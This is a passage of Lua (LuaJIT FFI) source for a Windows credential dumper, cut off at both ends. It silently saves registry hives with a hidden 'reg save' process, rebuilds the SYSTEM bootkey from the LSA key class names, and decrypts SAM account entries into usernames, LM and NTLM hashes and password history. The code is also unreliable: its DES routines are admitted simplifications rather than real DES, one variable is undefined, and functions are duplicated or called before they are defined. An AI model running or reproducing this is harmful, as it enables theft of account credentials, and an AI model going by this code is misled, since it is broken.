    -- Use reg save command directly (this is what works reliably)
    local command = string.format('reg save HKLM\\%s "%s" /y', hive_name, output_path)
    debug_log(string.format("Executing command: %s", command))
    
    -- Prepare process creation structures
    local si = ffi.new("STARTUPINFOA")
    si.cb = ffi.sizeof("STARTUPINFOA")
    si.dwFlags = 0x00000001 -- STARTF_USESHOWWINDOW
    si.wShowWindow = 0 -- SW_HIDE
    
    local pi = ffi.new("PROCESS_INFORMATION")
    
    -- Convert command to C string
    local command_len = #command
    local command_cstr = ffi.new("char[?]", command_len + 1)
    ffi.copy(command_cstr, command, command_len)
    
    -- Create the process
    local result = kernel32.CreateProcessA(nil, command_cstr, nil, nil, 0, 0, nil, nil, si, pi)
    
    if result == 0 then
        debug_log("Failed to create reg save process")
        return false
    end
    
    -- Wait for process to complete (max 30 seconds)
    local wait_result = kernel32.WaitForSingleObject(pi.hProcess, 30000)
    
    -- Get exit code
    local exit_code = ffi.new("DWORD[1]")
    kernel32.GetExitCodeProcess(pi.hProcess, exit_code)
    
    -- Clean up handles
    kernel32.CloseHandle(pi.hProcess)
    kernel32.CloseHandle(pi.hThread)
    
    debug_log(string.format("reg save exit code: %d", exit_code[0]))
    return exit_code[0] == 0
end

-- Fallback registry save using reg.exe command (mimics what reg save does)

local function read_registry_class(hkey, subkey)
    local key = ffi.new("HKEY[1]")
    
    -- Convert subkey to proper C string
    local subkey_len = #subkey
    local subkey_cstr = ffi.new("char[?]", subkey_len + 1)
    ffi.copy(subkey_cstr, subkey, subkey_len)
    
    -- Cast the numeric hkey to proper HKEY handle
    local hkey_handle = ffi.cast("HKEY", hkey)
    local result = advapi32.RegOpenKeyExA(hkey_handle, subkey_cstr, 0, 0x20019, key)
    
    if result ~= 0 then
        return nil
    end
    
    local class_size = ffi.new("DWORD[1]", 0)
    local query_result = advapi32.RegEnumKeyExA(key[0], 0, nil, nil, nil, nil, class_size, nil)
    
    if class_size[0] > 0 then
        local class_buffer = ffi.new("char[?]", class_size[0] + 1)
        local name_size = ffi.new("DWORD[1]", 1024)
        local name_buffer = ffi.new("char[1024]")
        
        query_result = advapi32.RegEnumKeyExA(key[0], 0, name_buffer, name_size, nil, class_buffer, class_size, nil)
        
        if query_result == 0 then
            advapi32.RegCloseKey(key[0])
            return ffi.string(class_buffer, class_size[0])
        end
    end
    
    advapi32.RegCloseKey(key[0])
    return nil
end

local function read_registry_value(hkey, subkey, value_name)
    local key = ffi.new("HKEY[1]")
    
    -- Convert subkey to proper C string
    local subkey_len = #subkey
    local subkey_cstr = ffi.new("char[?]", subkey_len + 1)
    ffi.copy(subkey_cstr, subkey, subkey_len)
    
    -- Convert value_name to proper C string
    local value_name_len = #value_name
    local value_name_cstr = ffi.new("char[?]", value_name_len + 1)
    ffi.copy(value_name_cstr, value_name, value_name_len)
    
    -- Cast the numeric hkey to proper HKEY handle
    local hkey_handle = ffi.cast("HKEY", hkey)
    local result = advapi32.RegOpenKeyExA(hkey_handle, subkey_cstr, 0, 0x20019, key)
    
    if result ~= 0 then
        return nil
    end
    
    local data_size = ffi.new("DWORD[1]", 0)
    local query_result = advapi32.RegQueryValueExA(key[0], value_name_cstr, nil, nil, nil, data_size)
    
    if query_result == 0 and data_size[0] > 0 then
        local data = ffi.new("BYTE[?]", data_size[0])
        query_result = advapi32.RegQueryValueExA(key[0], value_name_cstr, nil, nil, data, data_size)
        
        if query_result == 0 then
            advapi32.RegCloseKey(key[0])
            return ffi.string(data, data_size[0])
        end
    end
    
    advapi32.RegCloseKey(key[0])
    return nil
end

local function enum_registry_subkeys(hkey, subkey)
    local key = ffi.new("HKEY[1]")
    
    -- Convert subkey to proper C string
    local subkey_len = #subkey
    local subkey_cstr = ffi.new("char[?]", subkey_len + 1)
    ffi.copy(subkey_cstr, subkey, subkey_len)
    
    -- Cast the numeric hkey to proper HKEY handle
    local hkey_handle = ffi.cast("HKEY", hkey)
    local result = advapi32.RegOpenKeyExA(hkey_handle, subkey_cstr, 0, 0x20019, key)
    
    if result ~= 0 then
        return {}
    end
    
    local subkeys = {}
    local index = 0
    
    while true do
        local name_size = ffi.new("DWORD[1]", 256)
        local name_buffer = ffi.new("char[256]")
        
        local enum_result = advapi32.RegEnumKeyExA(key[0], index, name_buffer, name_size, nil, nil, nil, nil)
        
        if enum_result ~= 0 then
            break
        end
        
        table.insert(subkeys, ffi.string(name_buffer, name_size[0]))
        index = index + 1
    end
    
    advapi32.RegCloseKey(key[0])
    return subkeys
end

-- File I/O functions
local function parse_hive_header(file_data)
    if #file_data < 512 then
        return nil
    end
    
    local function read_uint32_le(data, offset)
        local a, b, c, d = string.byte(data, offset + 1, offset + 4)
        return a + (b * 256) + (c * 65536) + (d * 16777216)
    end
    
    local function read_uint64_le(data, offset)
        local low = read_uint32_le(data, offset)
        local high = read_uint32_le(data, offset + 4)
        return low + (high * 4294967296)
    end
    
    local signature = string.sub(file_data, 1, 4)
    if signature ~= "regf" then
        return nil
    end
    
    local header = {}
    header.signature = signature
    header.sequence1 = read_uint32_le(file_data, 4)
    header.sequence2 = read_uint32_le(file_data, 8)
    header.timestamp = read_uint64_le(file_data, 12)
    header.major_version = read_uint32_le(file_data, 20)
    header.minor_version = read_uint32_le(file_data, 24)
    header.type = read_uint32_le(file_data, 28)
    header.format = read_uint32_le(file_data, 32)
    header.root_key_offset = read_uint32_le(file_data, 36)
    header.hive_bins_data_size = read_uint32_le(file_data, 40)
    
    return header
end

local function read_hive_file(filename)
    local file = io.open(filename, "rb")
    if not file then
        return nil
    end
    
    local content = file:read("*all")
    file:close()
    
    if not content or #content == 0 then
        return nil
    end
    
    return content
end

local function find_key_in_hive(hive_data, key_path)
    local header = parse_hive_header(hive_data)
    if not header then
        return nil
    end
    
    -- This is a simplified key finder
    -- In a full implementation, you would traverse the hive structure
    return header.root_key_offset
end

-- Forward declarations for functions that are called before they're defined
local parse_nk_record
local find_key_by_path

-- Assign the parse_nk_record function to the forward declaration
parse_nk_record = function(hive_data, offset)
    -- Local helper functions for reading values
    local function read_le16_local(data, offset)
        if offset + 2 > #data then
            return nil
        end
        local a, b = string.byte(data, offset + 1, offset + 2)
        return a + (b * 256)
    end
    
    local function read_le32_local(data, offset)
        if offset + 4 > #data then
            return nil
        end
        local a, b, c, d = string.byte(data, offset + 1, offset + 4)
        return a + (b * 256) + (c * 65536) + (d * 16777216)
    end
    
    if offset + 76 > #hive_data then
        return nil
    end
    
    local signature = string.sub(hive_data, offset + 1, offset + 2)
    if signature ~= "nk" then
        return nil
    end
    
    local nk = {}
    nk.flags = read_le16_local(hive_data, offset + 2)
    nk.timestamp = read_le32_local(hive_data, offset + 4) -- Low part
    nk.access_bits = read_le32_local(hive_data, offset + 12)
    nk.parent_key_offset = read_le32_local(hive_data, offset + 16)
    nk.subkeys_count = read_le32_local(hive_data, offset + 20)
    nk.volatile_subkeys_count = read_le32_local(hive_data, offset + 24)
    nk.subkeys_list_offset = read_le32_local(hive_data, offset + 28)
    nk.volatile_subkeys_list_offset = read_le32_local(hive_data, offset + 32)
    nk.values_count = read_le32_local(hive_data, offset + 36)
    nk.values_list_offset = read_le32_local(hive_data, offset + 40)
    nk.security_key_offset = read_le32_local(hive_data, offset + 44)
    nk.class_name_offset = read_le32_local(hive_data, offset + 48)
    nk.largest_subkey_name_length = read_le32_local(hive_data, offset + 52)
    nk.largest_subkey_class_name_length = read_le32_local(hive_data, offset + 56)
    nk.largest_value_name_length = read_le32_local(hive_data, offset + 60)
    nk.largest_value_data_length = read_le32_local(hive_data, offset + 64)
    nk.work_var = read_le32_local(hive_data, offset + 68)
    nk.key_name_length = read_le16_local(hive_data, offset + 72)
    nk.class_name_length = read_le16_local(hive_data, offset + 74)
    
    -- Read key name
    if nk.key_name_length > 0 and offset + 76 + nk.key_name_length <= #hive_data then
        nk.key_name = string.sub(hive_data, offset + 76 + 1, offset + 76 + nk.key_name_length)
    end
    
    return nk
end

-- Find subkey by name in LF/LH/LI/RI list
local function find_subkey_by_name(hive_data, list_offset, target_name)
    -- Local helper functions for reading values
    local function read_le16_local(data, offset)
        if offset + 2 > #data then
            return nil
        end
        local a, b = string.byte(data, offset + 1, offset + 2)
        return a + (b * 256)
    end
    
    local function read_le32_local(data, offset)
        if offset + 4 > #data then
            return nil
        end
        local a, b, c, d = string.byte(data, offset + 1, offset + 4)
        return a + (b * 256) + (c * 65536) + (d * 16777216)
    end
    
    if not list_offset or list_offset == 0 then
        return nil
    end
    
    -- Try multiple offset calculations to be more dynamic
    local test_offsets = {}
    
    -- Method 1: Direct offset (for relative offsets within hive bins)
    table.insert(test_offsets, list_offset)
    
    -- Method 2: Add standard hive bin offset
    if list_offset < 4096 then
        table.insert(test_offsets, list_offset + 4096)
    end
    
    -- Method 3: Try interpreting as absolute offset
    if list_offset >= 4096 then
        table.insert(test_offsets, list_offset)
    end
    
    for attempt, abs_offset in ipairs(test_offsets) do
        if abs_offset + 8 <= #hive_data then
            local signature = string.sub(hive_data, abs_offset + 1, abs_offset + 2)
            
            -- Support multiple list types: lf (leaf fast), lh (leaf hash), li (leaf index), ri (root index)
            if signature == "lf" or signature == "lh" or signature == "li" or signature == "ri" then
                local elements_count = read_le16_local(hive_data, abs_offset + 2)
                if elements_count and elements_count > 0 then
                    
                    -- Different parsing for different list types
                    local element_size = 8  -- Default for lf/lh (4 bytes offset + 4 bytes hash)
                    if signature == "li" then
                        element_size = 4  -- li only has 4-byte offsets
                    elseif signature == "ri" then
                        element_size = 4  -- ri has 4-byte offsets to sublists
                    end
                    
                    for i = 0, elements_count - 1 do
                        local element_offset = abs_offset + 4 + (i * element_size)
                        if element_offset + 4 <= #hive_data then
                            local subkey_offset = read_le32_local(hive_data, element_offset)
                            if subkey_offset then
                                -- Handle ri (root index) which points to sublists
                                if signature == "ri" then
                                    -- Recursively search the sublist
                                    local found = find_subkey_by_name(hive_data, subkey_offset, target_name)
                                    if found then
                                        return found
                                    end
                                else
                                    -- Convert subkey offset to absolute (try both methods)
                                    local subkey_offsets = {subkey_offset}
                                    if subkey_offset < 4096 then
                                        table.insert(subkey_offsets, subkey_offset + 4096)
                                    end
                                    
                                    for _, subkey_abs_offset in ipairs(subkey_offsets) do
                                        local nk_record = parse_nk_record(hive_data, subkey_abs_offset)
                                        if nk_record and nk_record.key_name then
                                            if string.lower(nk_record.key_name) == string.lower(target_name) then
                                                return subkey_abs_offset
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                    
                    -- Found valid list but no matching key
                    return nil
                end
            end
        end
    end
    
    return nil
end

-- Assign the find_key_by_path function to the forward declaration
find_key_by_path = function(hive_data, start_offset, path)
    local current_offset = start_offset
    
    for i, key_name in ipairs(path) do
        debug_log(string.format("Looking for key: %s at offset 0x%x", key_name, current_offset))
        
        local nk_record = parse_nk_record(hive_data, current_offset)
        if not nk_record then
            debug_log(string.format("Failed to parse NK record at offset 0x%x", current_offset))
            return nil
        end
        
        -- Find the subkey with the matching name
        local found_offset = find_subkey_by_name(hive_data, nk_record.subkeys_list_offset, key_name)
        if not found_offset then
            debug_log(string.format("Subkey %s not found", key_name))
            return nil
        end
        
        current_offset = found_offset
        debug_log(string.format("Found %s at offset 0x%x", key_name, current_offset))
    end
    
    return current_offset
end

local function extract_class_from_hive(hive_data, system_hive_path)
    -- Extract the REAL bootkey from exported SYSTEM hive file
    -- This mimics what bkhive does - find the LSA keys and extract their class names
    
    debug_log("=== BOOTKEY EXTRACTION DEBUG SESSION ===")
    debug_log("Parsing SYSTEM hive to extract real bootkey...")
    debug_log(string.format("Hive file path: %s", system_hive_path))
    debug_log(string.format("Hive data size: %d bytes (%.2f MB)", #hive_data, #hive_data / 1024 / 1024))
    
    -- Parse the hive header to get the root key
    local header = parse_hive_header(hive_data)
    if not header then
        debug_log("Failed to parse SYSTEM hive header")
        return nil
    end
    
    debug_log("=== HIVE HEADER ANALYSIS ===")
    debug_log(string.format("Header signature: %s", string.sub(hive_data, 1, 4)))
    debug_log(string.format("Major version: %d", header.major_version))
    debug_log(string.format("Minor version: %d", header.minor_version))
    debug_log(string.format("Root key offset (from header): 0x%x", header.root_key_offset))
    
    -- Examine hive bin structure
    debug_log("=== HIVE BIN STRUCTURE ANALYSIS ===")
    
    -- Local helper for reading 32-bit little-endian values
    local function read_le32_local(data, offset)
        if offset + 4 > #data then
            return nil
        end
        local a, b, c, d = string.byte(data, offset + 1, offset + 4)
        return a + (b * 256) + (c * 65536) + (d * 16777216)
    end
    
    for bin_offset = 0x1000, math.min(0x8000, #hive_data - 4), 0x1000 do
        if bin_offset + 4 <= #hive_data then
            local bin_sig = string.sub(hive_data, bin_offset + 1, bin_offset + 4)
            debug_log(string.format("Offset 0x%x: signature = %s", bin_offset, bin_sig))
            if bin_sig == "hbin" then
                debug_log(string.format("  Found hbin at 0x%x", bin_offset))
                if bin_offset + 32 <= #hive_data then
                    local bin_size = read_le32_local(hive_data, bin_offset + 8)
                    local bin_file_offset = read_le32_local(hive_data, bin_offset + 12)
                    debug_log(string.format("  Bin size: 0x%x, File offset: 0x%x", bin_size or 0, bin_file_offset or 0))
                end
            end
        end
    end
    
    -- Try to find the first valid NK record by scanning
    debug_log("=== NK RECORD SCANNING ===")
    local found_valid_offset = nil
    local scan_start = 4096
    local scan_end = math.min(32768, #hive_data - 76)  -- Scan first 32KB or until near end of file
    
    debug_log(string.format("Scanning for NK records from 0x%x to 0x%x", scan_start, scan_end))
    debug_log("Looking for 'nk' signatures and valid NK records...")
    
    local nk_signatures_found = 0
    local valid_nk_records = 0
    
    for test_offset = scan_start, scan_end, 4 do  -- Scan in 4-byte increments
        if test_offset + 76 <= #hive_data then
            local signature = string.sub(hive_data, test_offset + 1, test_offset + 2)
            if signature == "nk" then
                nk_signatures_found = nk_signatures_found + 1
                debug_log(string.format("NK signature #%d found at offset: 0x%x", nk_signatures_found, test_offset))
                
                local test_nk = parse_nk_record(hive_data, test_offset)
                if test_nk and test_nk.key_name then
                    valid_nk_records = valid_nk_records + 1
                    debug_log(string.format("  Valid NK record #%d at 0x%x: name='%s', subkeys=%d, parent=0x%x", 
                        valid_nk_records, test_offset, test_nk.key_name, test_nk.subkeys_count or 0, test_nk.parent_key_offset or 0))
                    
                    if not found_valid_offset then
                        found_valid_offset = test_offset
                        debug_log(string.format("  *** SELECTED as first valid offset: 0x%x ***", test_offset))
                    end
                    
                    -- Check if this looks like a root key (has subkeys, parent = 0xffffffff)
                    if test_nk.subkeys_count and test_nk.subkeys_count > 0 and 
                       test_nk.parent_key_offset == 0xffffffff then
                        debug_log(string.format("  *** POTENTIAL ROOT KEY: subkeys=%d, parent=0x%x ***", 
                            test_nk.subkeys_count, test_nk.parent_key_offset))
                        if not found_valid_offset or test_nk.subkeys_count > 50 then  -- Root typically has many subkeys
                            found_valid_offset = test_offset
                            debug_log(string.format("  *** UPDATED selection to root-like key: 0x%x ***", test_offset))
                        end
                    end
                else
                    debug_log(string.format("  Invalid NK record at 0x%x (failed to parse or no name)", test_offset))
                end
            end
        end
    end
    
    debug_log(string.format("=== SCAN SUMMARY ==="))
    debug_log(string.format("NK signatures found: %d", nk_signatures_found))
    debug_log(string.format("Valid NK records: %d", valid_nk_records))
    debug_log(string.format("Selected offset: 0x%x", found_valid_offset or 0))
    
    -- The issue: We found ControlSet001 with parent 0x20, but our ROOT is at 0x1024
    -- Let's find the actual root key by looking for the key that ControlSet001 points to as parent
    debug_log("=== FINDING ACTUAL ROOT KEY ===")
    
    -- We know ControlSet001 is at 0x264c with parent 0x20
    -- So the real root should be at 0x20 + 4096 = 0x1020, or just 0x20
    local actual_root_candidates = {0x20, 0x1020, 0x1000 + 0x20}
    local actual_root_offset = nil
    
    for i, candidate in ipairs(actual_root_candidates) do
        debug_log(string.format("Testing root candidate #%d: 0x%x", i, candidate))
        if candidate <= #hive_data - 76 then
            local test_root = parse_nk_record(hive_data, candidate)
            if test_root and test_root.key_name then
                debug_log(string.format("  Candidate %d: Valid NK at 0x%x, name='%s', subkeys=%d", 
                    i, candidate, test_root.key_name, test_root.subkeys_count or 0))
                
                -- Check if this root has ControlSet001 as a subkey
                if test_root.subkeys_list_offset and test_root.subkeys_list_offset > 0 then
                    local found_cs = find_subkey_by_name(hive_data, test_root.subkeys_list_offset, "ControlSet001")
                    if found_cs then
                        debug_log(string.format("  *** ROOT FOUND: 0x%x contains ControlSet001 ***", candidate))
                        actual_root_offset = candidate
                        break
                    else
                        debug_log(string.format("  Candidate %d: No ControlSet001 found in subkeys", i))
                    end
                end
            else
                debug_log(string.format("  Candidate %d: Invalid NK record", i))
            end
        end
    end
    
    if not actual_root_offset then
        debug_log("Failed to find actual root key")
        return nil
    end
    
    debug_log(string.format("Using actual ROOT key at offset: 0x%x", actual_root_offset))
    current_offset = actual_root_offset
    
    -- Re-parse the root key with the correct offset
    local root_nk = parse_nk_record(hive_data, current_offset)
    if not root_nk then
        debug_log("Failed to parse actual root key")
        return nil
    end
    
    debug_log(string.format("Using ROOT key at offset: 0x%x (name: %s, subkeys: %d)", 
        current_offset, root_nk.key_name or "unknown", root_nk.subkeys_count or 0))
    
    debug_log(string.format("Root subkeys list offset: 0x%x", root_nk.subkeys_list_offset))
    
    -- Find CurrentControlSet (usually ControlSet001)
    debug_log("=== ATTEMPTING TO FIND LSA PATH ===")
    debug_log("Trying path: CurrentControlSet -> Control -> Lsa")
    local controlset_offset = find_key_by_path(hive_data, current_offset, {"CurrentControlSet", "Control", "Lsa"})
    if not controlset_offset then
        debug_log("CurrentControlSet not found, trying ControlSet001 -> Control -> Lsa")
        controlset_offset = find_key_by_path(hive_data, current_offset, {"ControlSet001", "Control", "Lsa"})
    end
    
    if not controlset_offset then
        debug_log("Direct path failed, trying to find ControlSet001 as individual key...")
        local cs001_offset = find_subkey_by_name(hive_data, root_nk.subkeys_list_offset, "ControlSet001")
        if cs001_offset then
            debug_log(string.format("Found ControlSet001 at offset: 0x%x", cs001_offset))
            debug_log("Now trying Control -> Lsa from ControlSet001...")
            controlset_offset = find_key_by_path(hive_data, cs001_offset, {"Control", "Lsa"})
        else
            debug_log("ControlSet001 not found as individual key either")
        end
    end
    
    if not controlset_offset then
        debug_log("Could not find LSA key in SYSTEM hive")
        return nil
    end
    
    debug_log(string.format("Found LSA key at offset: 0x%x", controlset_offset))
    
    -- Extract class names from the four bootkey component keys
    local jd_class = extract_key_class_name(hive_data, controlset_offset, "JD")
    local skew1_class = extract_key_class_name(hive_data, controlset_offset, "Skew1") 
    local gbg_class = extract_key_class_name(hive_data, controlset_offset, "GBG")
    local data_class = extract_key_class_name(hive_data, controlset_offset, "Data")
    
    if not jd_class or not skew1_class or not gbg_class or not data_class then
        debug_log("Failed to extract all bootkey components")
        debug_log(string.format("JD: %s, Skew1: %s, GBG: %s, Data: %s", 
            jd_class or "nil", skew1_class or "nil", gbg_class or "nil", data_class or "nil"))
        return nil
    end
    
    debug_log(string.format("Bootkey components - JD: %s, Skew1: %s, GBG: %s, Data: %s", 
        jd_class, skew1_class, gbg_class, data_class))
    
    -- Combine the class values to form the raw bootkey
    local combined = jd_class .. skew1_class .. gbg_class .. data_class
    debug_log("Combined bootkey string: " .. combined)
    
    -- Convert hex string to bytes
    local bootkey = ""
    for i = 1, #combined, 2 do
        local byte_hex = string.sub(combined, i, i + 1)
        local byte_val = tonumber(byte_hex, 16)
       
        if byte_val then
            bootkey = bootkey .. string.char(byte_val)
        else
            debug_log("Invalid hex in bootkey: " .. byte_hex)
            return nil
        end
    end
    
    -- Scramble the bootkey according to Windows algorithm
    local scrambled = ""
    local scramble_table = {0, 1, 3, 2, 6, 7, 5, 4, 10, 11, 9, 8, 14, 15, 13, 12}
    
    for i = 1, 16 do
        local src_index = scramble_table[i] + 1
        if src_index <= #bootkey then
            scrambled = scrambled .. string.sub(bootkey, src_index, src_index)



        end
    end
    
    -- Convert to hex string for display
    local bootkey_hex = ""
    for i = 1, #scrambled do
        bootkey_hex = bootkey_hex .. string.format("%02x", string.byte(scrambled, i))
    end
    
    debug_log("Real bootkey extracted: " .. bootkey_hex)
    return scrambled  -- Return the actual bytes, not hex string

end

-- Cryptography functions
local function rc4_init(key)
    local S = {}
    for i = 0, 255 do
        S[i] = i
    end
    
    local j = 0
    for i = 0, 255 do
        j = (j + S[i] + string.byte(key, (i % #key) + 1)) % 256
        S[i], S[j] = S[j], S[i]
    end
    
    return S
end

local function rc4_crypt(S, data)
    local output = {}
    local i, j = 0, 0
    
    for k = 1, #data do
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        local K = S[(S[i] + S[j]) % 256]
        output[k] = string.char(bit.bxor(string.byte(data, k), K))
    end
    
    return table.concat(output)
end

-- Bit manipulation functions
local function get_bit(data, pos)
    local byte_pos = math.floor(pos / 8) + 1
    local bit_pos = pos % 8
    if byte_pos > #data then
        return 0
    end
    local byte_val = string.byte(data, byte_pos)
    return bit.band(bit.rshift(byte_val, bit_pos), 1)
end

local function set_bit(data, pos, value)
    local byte_pos = math.floor(pos / 8) + 1
    local bit_pos = pos % 8
    if byte_pos > #data then
        return data
    end
    
    local bytes = {}
    for i = 1, #data do
        bytes[i] = string.byte(data, i)
    end
    
    if value == 1 then
        bytes[byte_pos] = bit.bor(bytes[byte_pos], bit.lshift(1, bit_pos))
    else
        bytes[byte_pos] = bit.band(bytes[byte_pos], bit.bnot(bit.lshift(1, bit_pos)))
    end
    
    local result = ""
    for i = 1, #bytes do
        result = result .. string.char(bytes[i])
    end
    
    return result
end

-- DES encryption functions
local function des_permute(data, table)
    local result = ""
    for i = 1, #table do
        local bit_pos = table[i] - 1
        local bit_val = get_bit(data, bit_pos)
        result = set_bit(result .. string.char(0), i - 1, bit_val)
    end
    return result
end

local function des_key_schedule(key)
    -- DES key schedule - simplified version
    local subkeys = {}
    
    -- Initial permutation and split
    local left = string.sub(key, 1, 4)
    local right = string.sub(key, 5, 8)
    
    -- Generate 16 subkeys (simplified)
    for i = 1, 16 do
        -- Rotate and permute (simplified)
        left = string.sub(left, 2) .. string.sub(left, 1, 1)
        right = string.sub(right, 2) .. string.sub(right, 1, 1)
        subkeys[i] = left .. right
    end
    
    return subkeys
end

local function des_f(right, subkey)
    -- DES F function (simplified)
    local result = ""
    for i = 1, #right do
        local r_byte = string.byte(right, i)
        local k_byte = string.byte(subkey, ((i - 1) % #subkey) + 1)
        result = result .. string.char(bit.bxor(r_byte, k_byte))
    end
    return result
end

local function des_encrypt(plaintext, key)
    if #plaintext ~= 8 or #key ~= 8 then
        return nil
    end
    
    local subkeys = des_key_schedule(key)
    
    -- Initial permutation (simplified - just split)
    local left = string.sub(plaintext, 1, 4)
    local right = string.sub(plaintext, 5, 8)
    
    -- 16 rounds
    for round = 1, 16 do
        local temp = right
        right = ""
        for i = 1, 4 do
            local l_byte = string.byte(left, i)
            local f_byte = string.byte(des_f(temp, subkeys[round]), i)
            right = right .. string.char(bit.bxor(l_byte, f_byte))
        end
        left = temp
    end
    
    -- Final permutation (simplified - just swap and concatenate)
    return right .. left
end

-- SAM hash decryption
local function decrypt_sam_hash(hash_data, hboot_key, rid)
    if #hash_data ~= 16 then
        return nil
    end
    
    -- Create DES keys from RID
    local rid_bytes = ffi.new("uint32_t[1]", rid)
    local rid_data = ffi.string(rid_bytes, 4)
    
    -- DES key 1: RID + constant
    local key1_data = rid_data .. "\x00\x00\x00\x00"
    local key1 = string.sub(key1_data, 1, 8)
    
    -- DES key 2: RID + different constant  
    local key2_data = rid_data .. "\x01\x00\x00\x00"
    local key2 = string.sub(key2_data, 1, 8)
    
    -- Split hash into two parts
    local hash_part1 = string.sub(hash_data, 1, 8)
    local hash_part2 = string.sub(hash_data, 9, 16)
    
    -- Decrypt each part
    local decrypted1 = des_encrypt(hash_part1, key1)
    local decrypted2 = des_encrypt(hash_part2, key2)
    
    if not decrypted1 or not decrypted2 then
        return nil
    end
    
    -- Combine and convert to hex
    local decrypted = decrypted1 .. decrypted2
    return bytes_to_hex(decrypted)
end

-- SAM parsing functions
local function parse_v_data_structure(v_data, rid, hboot_key)
    if not v_data or #v_data < 0x30 then
        return nil
    end
    
    local function read_le32(data, offset)
        if offset + 4 > #data then
            return nil
        end
        local a, b, c, d = string.byte(data, offset + 1, offset + 4)
        return a + (b * 256) + (c * 65536) + (d * 16777216)
    end
    
    local function read_le16(data, offset)
        if offset + 2 > #data then
            return nil
        end
        local a, b = string.byte(data, offset + 1, offset + 2)
        return a + (b * 256)
    end
    
    -- Read username offset and length
    local username_offset = read_le32(v_data, 0x10)
    local username_length = read_le32(v_data, 0x14)
    
    -- Read LM hash offset and length
    local lm_hash_offset = read_le32(v_data, 0x28)
    local lm_hash_length = read_le32(v_data, 0x2C)
    
    -- Read NTLM hash offset and length
    local ntlm_hash_offset = read_le32(v_data, 0x30)
    local ntlm_hash_length = read_le32(v_data, 0x34)
    
    local username = ""
    local lm_hash = "aad3b435b51404eeaad3b435b51404ee"  -- Empty LM hash
    local ntlm_hash = "31d6cfe0d16ae931b73c59d7e0c089c0"  -- Empty NTLM hash
    local password_history = {}
    
    -- Extract username
    if username_offset and username_length and username_offset > 0 and username_length > 0 then
        local abs_offset = 0xCC + username_offset
        if abs_offset + username_length <= #v_data then
            local username_data = string.sub(v_data, abs_offset + 1, abs_offset + username_length)
            -- Convert UTF-16LE to ASCII (simplified)
            username = ""
            for i = 1, username_length, 2 do
                local char_code = username_data:byte(i)
                if char_code > 0 and char_code < 128 then
                    username = username .. string.char(char_code)
                end
            end
        end
    end
    
    -- Extract LM hash
    if lm_hash_offset and lm_hash_length and lm_hash_offset > 0 and lm_hash_length == 16 then
        local abs_offset = 0xCC + lm_hash_offset
        if abs_offset + 16 <= #v_data then
            local lm_hash_data = v_data:sub(abs_offset + 1, abs_offset + 16)
            local decrypted_lm = decrypt_sam_hash(lm_hash_data, hboot_key, rid)
            if decrypted_lm and #decrypted_lm == 32 and decrypted_lm:match("^[0-9a-fA-F]+$") then
                lm_hash = decrypted_lm:lower()
            end
        end
    end
    
    -- Extract NTLM hash
    if ntlm_hash_offset and nt_hash_length and ntlm_hash_offset > 0 and nt_hash_length == 16 then
        local abs_offset = 0xCC + ntlm_hash_offset
        if abs_offset + 16 <= #v_data then
            local ntlm_hash_data = v_data:sub(abs_offset + 1, abs_offset + 16)
            local decrypted_ntlm = decrypt_sam_hash(ntlm_hash_data, hboot_key, rid)
            if decrypted_ntlm and #decrypted_ntlm == 32 and decrypted_ntlm:match("^[0-9a-fA-F]+$") then
                ntlm_hash = decrypted_ntlm:lower()
            end
        end
    end
    
    -- Extract password history
    local history_length = read_le32(v_data, 0x5C)
    if history_length and history_length > 0 and ntlm_hash_offset and nt_hash_length then
        local history_start = ntlm_hash_offset + nt_hash_length
        if history_start + history_length <= #v_data then
            -- Password history consists of concatenated 16-byte NTLM hashes
            local history_count = math.floor(history_length / 16)
            for h = 0, history_count - 1 do
                local hist_offset = history_start + (h * 16)
                if hist_offset + 16 <= #v_data then
                    local hist_hash_data = v_data:sub(hist_offset + 1, hist_offset + 16)
                    local decrypted_hist = decrypt_sam_hash(hist_hash_data, hboot_key, rid)
                    if decrypted_hist and #decrypted_hist == 32 and decrypted_hist:match("^[0-9a-fA-F]+$") then
                        table.insert(password_history, decrypted_hist:lower())
                    end
                end
            end
        end
    end
    
    return {
        username = username,
        rid = rid,
        lm_hash = lm_hash,
        ntlm_hash = ntlm_hash,
        password_history = password_history
    }
end

-- Registry hive parsing structures and functions
local HIVE_SIGNATURE = "regf"
local NK_SIGNATURE = "nk"
local VK_SIGNATURE = "vk"
local LF_SIGNATURE = "lf"
local LH_SIGNATURE = "lh"

-- Read little-endian 32-bit integer
local function read_le32(content, offset)
    if offset + 4 > #content then
        return nil
    end
    local a, b, c, d = string.byte(content, offset + 1, offset + 4)
    return a + (b * 256) + (c * 65536) + (d * 16777216)
end

-- Read little-endian 16-bit integer
local function read_le16(content, offset)
    if offset + 2 > #content then
        return nil
    end
    local a, b = string.byte(content, offset + 1, offset + 2)
    return a + (b * 256)
end

-- Parse registry hive header
local function parse_hive_header(hive_data)
    if #hive_data < 512 then
        return nil
    end
    
    local signature = string.sub(hive_data, 1, 4)
    if signature ~= HIVE_SIGNATURE then
        return nil
    end
    
    local header = {}
    header.sequence1 = read_le32(hive_data, 4)
    header.sequence2 = read_le32(hive_data, 8)
    header.timestamp = read_le32(hive_data, 12) -- Low part of timestamp
    header.major_version = read_le32(hive_data, 20)
    header.minor_version = read_le32(hive_data, 24)
    header.type = read_le32(hive_data, 28)
    header.format = read_le32(hive_data, 32)
    header.root_key_offset = read_le32(hive_data, 36)
    header.hive_bins_data_size = read_le32(hive_data, 40)
    header.clustering_factor = read_le32(hive_data, 44)
    
    return header
end

-- Helper function to extract class name from a specific subkey
local function extract_key_class_name(hive_data, parent_offset, key_name)
    debug_log(string.format("Extracting class name for key: %s", key_name))
    
    local parent_nk = parse_nk_record(hive_data, parent_offset)
    if not parent_nk then
        debug_log("Failed to parse parent NK record")
        return nil
    end
    
    -- Find the specific subkey
    local key_offset = find_subkey_by_name(hive_data, parent_nk.subkeys_list_offset, key_name)
    if not key_offset then
        debug_log(string.format("Key %s not found", key_name))
        return nil
    end
    
    local key_nk = parse_nk_record(hive_data, key_offset)
    if not key_nk then
        debug_log(string.format("Failed to parse NK record for %s", key_name))
        return nil
    end
    
    -- Extract the class name (this is where the bootkey component is stored)
    if key_nk.class_name_offset and key_nk.class_name_offset > 0 then
        -- Convert class offset to absolute
        local class_offset = key_nk.class_name_offset
        if class_offset < 4096 then
            class_offset = class_offset + 4096
        end
        
        local class_length = key_nk.class_name_length or 8  -- Bootkey components are typically 8 chars
        
        if class_offset + class_length <= #hive_data then
            local class_name = string.sub(hive_data, class_offset + 1, class_offset + class_length)
